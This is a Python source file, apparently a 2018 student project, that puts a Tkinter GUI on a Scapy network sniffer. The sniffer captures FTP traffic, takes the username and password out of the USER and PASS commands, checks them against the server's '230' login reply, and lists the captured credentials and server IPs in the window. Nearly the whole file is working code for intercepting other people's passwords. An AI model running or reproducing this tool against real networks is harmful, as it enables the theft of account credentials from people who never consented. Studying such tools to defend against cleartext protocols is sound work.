"""
Name: Bradley Braganza, Zubair Matani, David May, and Vinny Sosa
Date: April 2, 2018
File: guiPlusSnif.py
Description: A sniffer program that is able to isolate username and passwords
    in the packets transferred over FTP. We will validate these found
    credentials and ensure that they are valid for the server
    A GUI interface designed to run in conjunction with out network sniffing program
"""

import sys
import threading
from Tkinter import *
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR) # downloading the Scapy Library
try:
    from scapy.all import *
    
except ImportError:
    print 'Error: Scapy Installation Incomplete' # the Scapy library could not be downloaded
    sys.exit(1)
###############   

user = []
pswrd = [] 
ip = []

def quitProgram():
		sys.exit()
		t.stop()####

def getInterface():
		interface = interfaceEntry.get()
		print 'Interface: ' + interface
		return interface
		
def startSniffing():
		
		interface = getInterface()
 
		usernames = ['Error: NONE'] # default constructor for the Username
		passwords = ['Error: NONE'] # default constructor for the Password
		#ips = ['Error: None'] #default constructor for the list of IPs
		 
		def loginCheck(pkt, username, password): #definition of a function
				try:
				    if '230' in pkt[Raw].load: # 230 denotes a successful login and therefore is something we need  
				    	if username not in user:
						      print 'Valid Credentials Found!! '
						      print '\t' + 'From: ' + str(pkt[IP].dst).strip() + ' -> ' 'To: '+ str(pkt[IP].src).strip() + ':' 
						      print '\t   Username: ' + username # prints username 
						      print '\t   Password: ' + password + '\n'  #prints password
						      user.append(username)
						      pswrd.append(password)
						      ip.append(str(pkt[IP].dst).strip())
				        	
				        
				        return
				    else:
				        return
				except Exception:
				    return 
		 
		def CheckFTP(pkt): # defintion of a new function 'Check_for_FTP'
				if pkt.haslayer(TCP) and pkt.haslayer(Raw): #if the packet has a TCP header or raw layer
				    if pkt[TCP].dport == 2121 or pkt[TCP].sport == 2121: #port 21 is associated with the server side of the communication  
				        return True # if the packet passes these two test, then it returns true
				    else:
				        return False # if it does not pass check 2
				        
				    return False # does not pass check 1
		 
		def pktCheck(pkt): #final definition of function 'Check Packet'
				if CheckFTP(pkt): # does the preliminary check of the prev function
				    pass
				else:
				    return  # the packet did not pass the prev function so false is returned
				data = pkt[Raw].load # loads the packet if it passes the prev tests
				if 'USER ' in data: #searches for keyword 'user' in packet
				    usernames.append(data.split('USER ')[1].strip()) # splits user and username string
				elif 'PASS ' in data: 
				    passwords.append(data.split('PASS ')[1].strip())
				else:
				    loginCheck(pkt, usernames[-1], passwords[-1]) #this function checks the last gathered credentials to make sure they're legit
				return
		 
		print 'Sniffing Started on %s... \n' % interface #begins the packet sniffing
		try:
				sniff(iface=interface, prn=pktCheck, store=0) #initializing the scapy sniff function we specify the interface to sniff on, and then put these packets through the check packet function
		except Exception:
				print 'Error: Failed to Initialize Sniffing' # could not begin sniffing
				sys.exit(1)
		print '\nSniffing Stopped' # the sniffing has stopped 

def sniffThread():
		t = threading.Thread(target=startSniffing)
		t.daemon = True
		t.start()#####
		
def printUser():
		print 'Usernames: ',user[0:]
		userLabel['text']=user[0:]
		return 
		
def printPass():
		print 'Passwords: ',pswrd[0:]
		passLabel['text']=pswrd[0:]
		return 
		
def printIP():
		print 'IP Address: ',ip[0:]
		ipLabel['text']=ip[0:]
		return 
			
#def updatePasswords():
	

###############
master = Tk()
master.title("FTP Sniffer")
master.geometry('600x400')
master.configure(background='black')

interfaceLabel = Label(master, text = 'Enter network interface', bg='black', fg='green')
interfaceLabel.grid(row= 0, column=2)

interfaceLabel = Label(master, text="                      ", bg='black')
interfaceLabel.grid(rowspan = 5, columnspan=1)

interfaceEntry = Entry(master, bg = 'black', fg='green')
interfaceEntry.config(width = 16)
interfaceEntry.grid(row= 1, column=2)

startButton = Button(master, bg='black', fg='green', text="Start Sniffing",  command=sniffThread)
startButton.config(height = 2, width = 13)
startButton.grid(row= 2, column=2, padx = 10, pady = 10)

userButton = Button(master, text = 'Print Usernames', command = printUser, bg='black', fg='green')
userButton.config(height = 2, width = 13)
userButton.grid(row= 3, column=1, pady = 10)

userLabel = Label(master, text = 'Usernames ', bg='black', fg='green')
userLabel.grid(row= 3, column=3, sticky=W)

passButton = Button(master, text = 'Print Passwords', command = printPass, bg='black', fg='green')
passButton.config(height = 2, width = 13)
passButton.grid(row= 4, column=1, pady = 10)

passLabel = Label(master, text = 'Passwords ', bg='black', fg='green')
passLabel.grid(row= 4, column=3, sticky=W)

ipButton = Button(master, text = 'Print IP Address', command = printIP, bg='black', fg='green')
ipButton.config(height = 2, width = 13)
ipButton.grid(row= 5, column=1,pady = 10)

ipLabel = Label(master, text = 'IP Address ', bg='black', fg='green')
ipLabel.grid(row= 5, column=3, sticky=W)

exitButton = Button(master, text='Exit', command= quitProgram, bg='black', fg='red')
exitButton.config(height = 2, width = 13)
exitButton.grid( column=2, sticky = S,pady = 70)

mainloop()

###############

#check and see why buttons affect sniffing capabilities


